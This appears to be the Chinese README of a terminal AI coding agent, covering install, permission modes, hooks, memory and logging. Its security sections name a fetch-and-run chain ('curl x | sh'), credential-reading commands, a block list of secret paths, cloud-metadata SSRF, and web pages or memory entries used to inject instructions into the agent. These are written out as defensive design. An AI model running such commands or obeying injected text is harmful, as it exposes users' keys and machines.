# Feiyu Agent

简体中文 | [English](README.en.md)

Feiyu Agent 是一个跑在终端里的编程助手。你把任务交给它，它会自己读代码、改文件、执行命令，一步步把事情做完，整个过程你都看得到它在做什么。它可以用 Claude、DeepSeek 或 Kimi。

## 安装

一条命令：

```
git clone https://github.com/feiyuceng06-prog/feiyu-agent.git && cd feiyu-agent && ./install.sh
```

脚本会建虚拟环境、装依赖、往 `~/.local/bin` 放一个 shim，之后在任何目录敲 `feiyu` 都能用。需要 Python 3.10 以上，没有的话它会告诉你。重复运行是安全的，升级代码后再跑一次就行。

**装完是空的，模型要自己加**：运行 `feiyu`，打 `/key add`，填接口地址、模型 id 和密钥。三样填完就能用了，详见下面「模型」一节。

<details>
<summary>不想用脚本，手动装</summary>

```
python -m venv .venv
source .venv/bin/activate       # Windows 用 .venv\Scripts\activate
pip install -e ".[openai]"
```

以后每次用之前先 source 一下这个 .venv。嫌麻烦就自己放个 shim：

```
printf '#!/usr/bin/env bash\nexec %s/.venv/bin/feiyu "$@"\n' "$PWD" > ~/.local/bin/feiyu
chmod +x ~/.local/bin/feiyu
```

`.[openai]` 里的 openai 包是给 DeepSeek、Kimi 和各种 OpenAI 兼容接口用的；只用 Claude 原生接口的话 `pip install -e .` 就够。

</details>

## 使用

直接运行 feiyu 就进入交互模式，工作目录是当前目录：

```
feiyu
```

默认用你上次选的模型。想指定别的，`-m` 加 `/key` 里的名字：

```
feiyu -m ds-flash
```

想让它在别的项目里工作，加 `-w` 指定目录：

```
feiyu -w ~/code/my-project
```

只想跑一个任务、跑完就退出的话，把任务直接写在后面：

```
feiyu "给命令行加一个 --json 参数，并更新测试"
```

`-r` / `--resume` 接着上次在这个目录里的对话，`-V` 看版本号。

## 界面

进去之后是一个带框的输入区，工具调用、文件改动的 diff、模型的回答都直接打在下面。

```
╭─────────────────────────────────── deepseek  ·  上下文 1.4k  ·  ¥0.0014 ─╮
│ > 把 tools.py 里的 search 改成用 rg
╰──────────────────────────────────────────────────────────────────────────╯

⏺ Read(feiyu/tools.py)
  ⎿  读取 217 行

⏺ Update(feiyu/tools.py)
  ⎿  已修改 1 处
       47  -  rx = re.compile(args["regex"])
       47  +  if shutil.which("rg"):

  改完了，search 现在优先走 rg，找不到就退回原来的正则实现。
```

按键：`⏎` 发送，`\⏎` 换行，`shift+tab` 切换权限模式，`esc` 中断当前回答，`ctrl-d` 退出，`↑` `↓` 翻历史。

斜杠命令（打 `/` 会弹补全）：

| 命令 | 作用 |
|---|---|
| `/help` | 显示帮助 |
| `/model` | 列出已配置的模型；`/model <名字>` 切换，对话历史保留 |
| `/style` | 切换回答风格：`default` / `concise` / `explanatory` / `teaching` |
| `/key` | 添加 / 查看 / 删除模型配置：`/key add`、`/key`、`/key rm <名字>` |
| `/mode` | 切换权限模式：`default` / `auto` / `readonly` |
| `/allow` | 查看或添加权限规则 |
| `/verify` | 查看或设置改完自动跑的校验命令 |
| `/review` | 让一个没看过过程的模型给这次改动打分 |
| `/cost` | 按任务看最近的 token 和花费 |
| `/memory` | 查看 / 添加 / 删除这个目录的长期记忆 |
| `/hooks` | 看在哪些时机会跑哪些外部命令 |
| `/context` | 查看并重新加载项目约定文件 |
| `/compact` | 把历史压缩成一段摘要，省上下文 |
| `/clear` | 清空对话历史和存盘，重新开始 |
| `/exit` | 退出 |

顶边框右侧显示**上下文占满多少**和**这次会话累计花了多少钱**。

上下文显示的是百分比而不是 token 数。每次请求都带着一千多 token 的固定底噪（工具定义加系统提示），所以哪怕只说一句「你好」，绝对数字也在 1.5k 上下——这个数既吓人又没法据此做任何决定，占比才说明还剩多少余地。没配价格的模型不显示金额，也不拿 token 数凑数。

价钱来自你在 `/key add` 里填的那三项，没填就显示 token 数，见下面「模型」一节。
### 权限模式

`shift+tab` 循环切换，也可以 `/mode <名字>`。当前模式显示在输入框顶边左侧。

| 模式 | 行为 |
|---|---|
| `default` 默认 | 允许列表里的直接跑，其余问你一声（启动默认） |
| `auto` 自动 | 所有工具调用直接执行，不打断 |
| `plan` 计划 | 只让它看和想，方案讲清楚、你同意了才动手 |
| `readonly` 只读 | 只让它读文件、列目录、搜索、抓网页，写和执行一律拒绝 |

问你的时候有四个选择：`y` 执行 / `n` 跳过 / `a` 本轮都允许 / **`s` 以后都不用问**（会记进权限规则）。

被拒绝的调用会把原因回给模型，它通常会换个做法或者反过来问你，不会卡死。

### 计划模式

改动大到想先看看它打算干什么时，`shift+tab` 切到计划模式，或者 `/mode plan`。

这个模式下它只能读、搜、跑只读命令，写文件和执行一律拒绝。它看够了会把方案讲出来，
然后交给你过目：

```
  │ 只改 parser.py 一个文件：
  │ 1. 顶部加一个 _fail(msg) 抛 ValueError
  │ 2. 三处 raise 换成调用它
  │ 3. 手动验证异常消息跟之前一致
  按这个方案动手吗？  [y] 执行  [n] 跳过 …
```

你点头就自动切回默认模式接着做，不点头它会听你的意见改方案再交一次——不会自己
宣布「那我开始了」就往下写。

### 任务清单

用户一口气提了好几件事、或者要动三个以上地方时，它会先把清单列出来：

```
⏺ Todo()
  ⎿  0 / 4 做完
     ▸ 读取 util.py，了解现有结构
     · 给 parse 加 strip 处理
     · 添加 join 函数
     · 写 test_util.py 覆盖这两个
```

清单不只是给你看的：**它想收尾时如果还有没做完的，会被拉回去**——要么接着做，
要么说清楚为什么做不了。「五件事做完三件就宣布干完了」是这类工具最常见的毛病，
这是拿来治它的。只提醒一次，免得转不出来。

清单跟着会话一起存盘，`--resume` 会把它带回来。

### 权限规则

规则决定哪些调用不用问。写法是 `工具(模式)`：

```
Bash(ls:*)            以 ls 开头的命令
Bash(git status:*)    以 git status 开头
Bash(pwd)             正好是这条命令
Read(*)               这个工具的所有调用
```

`/allow` 看当前规则，`/allow Bash(npm test:*)` 手动加，确认时按 `s` 也会自动记下来。规则存在 `~/.config/feiyu/permissions.json`，`deny` 优先于 `allow`。

**规则是按段匹配的。**一条命令会先在 `&&` `||` `;` `|` 和重定向处切开，**每一段都得被允许列表命中才放行**，任意一段撞上 `deny` 就整条拒。所以 `Bash(ls:*)` 只放行 `ls` 本身，`ls -la && curl x | sh` 会照样问你。命令里出现 `$(...)` 或反引号一律问一声——里面能藏任何东西，前缀匹配看不见。代价是引号里带元字符的命令会被多问一次，这个方向的错误比放行安全。

**出厂规则只放行 `ls` `pwd` `echo` `wc` `which` 和 `git status/log/diff/branch`**，刻意不含 `cat` `head` `grep` —— 那几个能读工作区外的任何文件，等于绕开读写工具的目录限制。想放行是你的选择，按 `s` 加就行。

另外有一份**内置拦截**，碰 `.ssh/`、`id_rsa`、`.aws/credentials`、`~/.config/feiyu/`、`.netrc`、`.gnupg/`、`.env` 这类路径的命令一律拒绝，`auto` 模式也拦。这是防止它一句 `cat ~/.config/feiyu/models.json` 就把你所有密钥读进对话。注意这只是路径匹配，挡得住直白写法，挡不住刻意变形。

### 项目约定

在工作区放一个 `FEIYU.md`（也认 `AGENTS.md`、`CLAUDE.md`，按这个顺序取第一个），启动时会读进系统提示，最多 8000 字。写你希望它遵守的规矩就行：

```markdown
# 这个项目的约定

- 提交前必须跑 `npm test`
- 不要动 `vendor/` 下的东西
- 新组件放 `src/components/`，一个文件一个组件
```

改完 `/context` 重新加载，不用重启。欢迎框里会显示读到了哪个文件、多少字。

### 上下文与会话

对话历史每轮都要完整重发，所以会一直变大。两条路：

- **自动压缩**：上下文超过上限的 75% 时，它会把之前的对话交给模型总结成一段交接说明，替换掉原文再继续。**任务进行中也会压**——读了十几个文件的长任务不会因为堆满上下文而中断。上限默认按 128k 算，某个模型不一样的话在 `~/.config/feiyu/models.json` 里给那条加 `"limit": 32000`。
- **手动**：`/compact` 随时压一次，`/clear` 直接清空。

对话会自动存盘，下次 `feiyu --resume` 接着聊。**存盘里是完整对话原文**（含 agent 读过的文件内容），放在 `~/.local/state/feiyu/sessions/`，权限 600，一个工作目录一份。`/clear` 会连存盘一起删。

### 模型

模型清单完全由你自己维护，**没有内置厂商，也没有默认模型，装完是空的**。用 `/key add` 添加：

```
   名称（/model 里显示成这个）: ds-flash
   接口地址 base_url: https://api.deepseek.com
   模型 id: deepseek-v4-flash
   API key: ****************
   接口类型 openai / anthropic [openai]:
  下面三项是价格，人民币每百万 token，留空就只显示 token 数不算钱
     缓存命中价（没有缓存就填 0）: 0.02
     输入价: 1
     输出价: 2
```

之后 `/model` 看清单、`/model ds-flash` 切换（对话历史保留），`/key` 看已存条目（密钥打码），`/key rm <名字>` 删除。下次启动默认用你上次选的那个，也可以 `feiyu -m ds-flash` 指定。

配置存在 `~/.config/feiyu/models.json`，权限 600。输入密钥走的是独立的隐藏输入，不会进 feiyu 的输入历史。

价格那三项可以留空：填了就在顶边显示这次会话花了多少钱，不填就显示 token 数。**没有内置价格表**——模型改名调价太频繁，写死的表迟早给出错的报价，而报错价比不报价更糟。
## 它能做什么

给它一个任务后，它不会闷头乱改，而是先弄清情况再动手：先读相关文件、用关键词或正则搜一搜代码，摸清结构，然后再新建或修改文件。改完之后一般会跑一遍测试或相关命令，确认没搞坏。

这些都是靠七个基本能力完成的——执行 shell 命令、读文件、写文件、精确替换文件里的某一段、按通配符列目录、用正则搜内容、抓网页。它每用一个都会在屏幕上打出来，所以它做了什么你一直看得见。

### 办公文档

读文件时遇到 `.docx` `.xlsx` `.pptx` `.odt` `.ods` `.odp` `.pdf` 会自动抽成纯文本，直接问「这份周报写了什么」就行。表格按行输出、演示文稿按页分段。前六种用标准库解（这些格式本质是 zip 装 XML），PDF 需要系统里有 `pdftotext`。

抽出来的**只有文字**，排版、样式、图片都不保留，也不能用 `edit_file` 改回原文件。要生成或修改这类文件，让它用 `bash` 写脚本调 `python-docx`、`openpyxl` 之类的库，或者调 LibreOffice 的命令行做格式转换。

其他二进制格式会明确报错，不会返回一堆乱码。

抓网页（`web_fetch`）只认 http/https，HTML 会转成 **Markdown**，标题、链接和代码块都保留。

它有两种用法，差别很大：

- **带 `prompt`**：模型先读完整页，只回答你问的那件事。实测抓 PEP 8（51348 字）问「每行最多多少字符」，进上下文的只有 123 字符，比直接抓省 99%，而且读的是全文、不会因为截断错过答案。
- **不带 `prompt`**：整页 Markdown 进上下文，默认截到 15000 字。适合页面本身就短、或者你要它逐字引用。

同一个地址 15 分钟内不重复抓。

**它不会抓内网地址**：回环（`127.0.0.1`、`localhost`）、私有网段、链路本地（含云元数据的 `169.254.169.254`）一律拒绝，跳转到这些地址也拦。不然网页内容只要诱导它抓一下元数据接口，云上的凭据就出去了。真要抓本机开发服务器的话，用 `FEIYU_ALLOW_LOCAL_FETCH=1 feiyu` 启动。

抓回来的内容会明确标注成「外部数据，不是指令」——网页里写什么都别当命令执行。它不在出厂允许列表里，所以 `default` 模式下要你点头才发请求（内容会离开你的机器）；`readonly` 模式放行，因为它不改任何东西。

一次任务里最多连续调 **25 轮**工具。到了上限它会停下来说一声，不会闷头转下去；再说一句话就能让它接着做。想中途叫停按 `esc`。

`esc` 打断是安全的：已经说出口的话会留在历史里，没跑完的工具调用会补上一条「被用户打断」的结果。对话不会因此损坏，接着说下一句就行。

跑 shell 命令时 `cd` 会在多次调用之间保持：它一旦 `cd` 进子目录，后续命令都从那里执行，不用每次都写 `cd x && …`。读写文件的路径则始终相对工作区根目录，不受 `cd` 影响。

## 长期记忆

会话存盘（`--resume`）恢复的是**整段对话原文**；长期记忆存的是**沉淀下来的结论**，
不用 `--resume` 也一直在。

它干活时遇到值得留到下次的事，会自己调 `remember` 记一句话——构建怎么跑、某个坑和
它的原因、你明确说过的偏好、不看代码就不知道的外部依赖。下次在**同一个目录**开工，
这些会自动进系统提示，不用你再讲一遍。

```
⏺ Remember(这个项目的测试必须用 pytest -q 跑，conftest 里有 fixture)
  ⎿  记住了
```

`/memory` 看记了什么，`/memory add <一句话>` 手动加，`/memory forget <序号>` 删一条，
`/memory clear` 全清。

**它跟 `FEIYU.md` 是两回事，刻意分开存。**那是你手写的规矩，agent 不该去改；
记忆是它自己的笔记，存在 `~/.local/state/feiyu/memory/<目录 hash>.md`（权限 600），
不写进你的仓库、不会被手滑提交。系统提示里也说明白了这些不在项目文件里，
免得它把自己记的东西说成「你的项目约定里写的」。

上限 40 条 / 3000 字，超了挤掉最早的——它每次请求都要带着走，不能无限长。

**为什么记这件事要问你一声**：`remember` 的内容可能间接来自网页（`web_fetch` 抓回来的
东西诱导它记一句话），而记下的东西会进以后**每一次**的系统提示，等于一条能跨会话的
注入通道。所以它跟写文件一样归 `default` 模式确认，`readonly` 模式直接拒绝，
每次记什么都写进日志。确认行会把要记的原话显出来，不用盲签。

## 自动校验

在项目约定文件里单起一行：

```
verify: npm test
```

之后它每次写完或改完文件，都会自动跑这条命令。**没过就把报错原样交给它自己修**，
不用你在旁边盯着。`/verify` 看当前设的是什么，`/verify <命令>` 临时改，`/verify off` 关掉。

只有 `write_file` 和 `edit_file` 触发。`bash` 也能改文件，但把它算进来的话，
每次 `ls` 或 `git status` 之后都要跑一遍测试，代价远大于收益。

这一行其实就是下面钩子的简写——它会被当成一条 `PostToolUse` 钩子来跑。

## 钩子

想加的规矩不止「改完跑测试」一条时，写 `hooks.json`：

```json
{
  "PreToolUse": [
    {"matcher": "Bash(git push:*)",
     "command": "echo '这个仓库禁止直接 push，请开 PR' >&2; exit 1"}
  ],
  "PostToolUse": [
    {"matcher": "Write|Update", "command": "ruff check ."}
  ],
  "UserPromptSubmit": [
    {"command": "git branch --show-current"}
  ],
  "Stop": [
    {"command": "notify-send 'feiyu 干完了'"}
  ]
}
```

四个时机：

| 事件 | 什么时候 | 非零退出码的效果 |
|---|---|---|
| `PreToolUse` | 工具跑之前 | 拦下这次调用，理由回给模型 |
| `PostToolUse` | 改完文件之后 | 把输出交给模型，让它自己修 |
| `UserPromptSubmit` | 你按下回车时 | 拦下这次提问 |
| `Stop` | 一轮答完时 | 只记日志，不影响流程 |

**退出码 0 放行、非 0 拦下**，跟 Claude Code 一致。拦下时 stdout 和 stderr 都会回给模型
（unittest 把失败写 stderr、pytest 写 stdout，只取一个总有一半工具的报错是空的）。
放行时 `UserPromptSubmit` 的 stdout 会作为额外背景带上——上面那条的效果就是它每次都知道
你在哪个分支上。

钩子从 stdin 收一份 JSON（`event` / `tool` / `subject` / `workspace`），要什么自己解析。
`matcher` 用的就是权限规则那套语法，`|` 分隔多条，裸工具名等于全匹配。密钥类环境变量
不会传给钩子，跟 `bash` 工具一样。

放两个地方，都会跑：

- `~/.config/feiyu/hooks.json` —— 你自己的，直接生效
- 工作区的 `.feiyu/hooks.json` —— **第一次见到要你点头才启用**

**为什么项目钩子要问一声**：那个文件是从仓库里带下来的，直接跑等于「clone 一个仓库就在
你机器上执行任意代码」。同意过的按**内容 hash** 记在 `~/.config/feiyu/trusted-hooks.json`，
所以文件一改就会重新问——不然同意过一次之后，仓库里换成 `rm -rf` 也照跑。
非交互场景（管道、脚本）一律不跑项目钩子。

`/hooks` 看当前生效的是哪些、分别来自哪里。

## 独立评分

`/review`，或者一次性任务加 `--review`：

```bash
feiyu --review "把 parser.py 里的错误处理补全"
```

跑完之后会**另开一个模型**，只给它看任务描述和最终的 diff——它没参与过这个任务，
也看不到中间的思考过程，这是故意的，避免"自己批改自己作业"。它按完成度、有没有 bug、
有没有多做没要求的事三条给结论，最后给个 0-10 的分。

有 git 就看 `git diff HEAD`，没有版本库就拿改动前后的内容自己算 diff。

**这会多花一次 API 调用**，所以是手动触发，不会每轮自动跑。

## 结构化输出

想把结果接进别的程序时，给一份 JSON schema：

```bash
feiyu --json-schema review.schema.json "检查 calc.py 有没有 bug" > out.json
```

任务照常跑（工具、确认、校验都不变），跑完再要一轮让它按 schema 输出。
**stdout 里只有 JSON**，界面和日志全部走 stderr，所以可以直接管道给别的程序。
输出不合 schema 会把具体问题回给它重出，最多两次；实在不合就非零退出。

schema 支持 `type` / `required` / `properties` / `items` / `enum` / `additionalProperties`
——够用，没有为此引入 `jsonschema` 依赖。

## 日志与花费

每件事记一行 JSONL 到 `~/.local/state/feiyu/logs/<日期>.jsonl`（权限 600）：
每次工具调用、参数、权限判定结果、耗时、每轮的 token 用量、校验和评分结果。
事后排查"它当时为什么干了那件怪事"就按 `run` 字段过滤。

`/cost` 按任务汇总最近七天：

```
   08-27 00:14  修好 parser.py 的错误处理           5轮    8.2k     ¥0.031
   08-27 09:02  给 CLI 加 --json 参数              12轮   31.5k     ¥0.118

   合计  39.7k  ¥0.149
```

没配价格的模型只显示 token 数。`FEIYU_NO_LOG=1` 完全关掉记录。
**日志里有命令原文和文件路径**，跟会话存盘一样按 600 存，但它不是加密的。

## 安全须知

Feiyu 会真的在你机器上跑命令、改文件，**权限和你本人完全一样**。默认的 `default` 模式只放行允许列表里的调用，其余会问你；嫌烦可以 `shift+tab` 切到 `auto`，但那就没有任何确认了。

读写文件的三个工具（`read_file` / `write_file` / `edit_file`）确实被限制在工作目录内，越界会被拒绝。但 **`bash` 工具没有这层限制**——它能读写你账号能碰的任何路径，也能联网。`cd` 越界会弹回工作区，那只影响下一条命令从哪开始，不阻止当前命令访问外面。

执行 shell 命令时，**变量名里带 `KEY` / `TOKEN` / `SECRET` / `PASSWORD` 字样的环境变量不会传给它**，免得它一句 `echo $DEEPSEEK_API_KEY` 就把密钥读进对话、再发回给模型厂商。`SSH_AUTH_SOCK` 这类名字里没关键词的会保留，所以 `git push` 照常能用。确实需要让它拿到某个密钥（比如它要跑的脚本用得上），用 `FEIYU_KEEP_ENV_SECRETS=1 feiyu` 启动。

但这只挡住了「顺手读到」这一类。**`bash` 没有沙箱，它照样能直接 `cat ~/.ssh/id_rsa`** —— 环境变量过滤降低的是误伤和轻度诱导的风险，不等于隔离。真要隔离得上容器。

所以：在你信任、并且用 git 管理的项目上用它，改坏了好回退；别在放着敏感凭据的机器上跑不受信任的任务。真需要硬隔离的话，把它放进容器或虚拟机。

## 平台

Linux 和 macOS 完整可用。

Windows 目前**只在 WSL 里可用**：`install.sh` 是 bash 脚本；`bash` 工具的 `cd` 保持机制用的是 POSIX shell 语法；`esc` 中断和确认提示的单键输入依赖 termios。原生 Windows 上这几块都会失效，配置文件的 600 权限也不生效。

## 测试

标准库 `unittest`，不引测试框架：

```bash
python -m unittest discover -s tests -t .
```

175 个用例，一秒跑完，不打任何真实 API——后端是假的，只有 `bash` 工具真的起子进程。
测试用临时目录跑，不会碰 `~/.config/feiyu/` 里的密钥和权限规则。

盯得最紧的是**历史形状**：`tool_use` 少一条配对结果、角色不交替，下一次请求就是 400，
会话再也发不出去。中断落在流式输出里和落在工具执行里是两条不同的路径，各有用例。
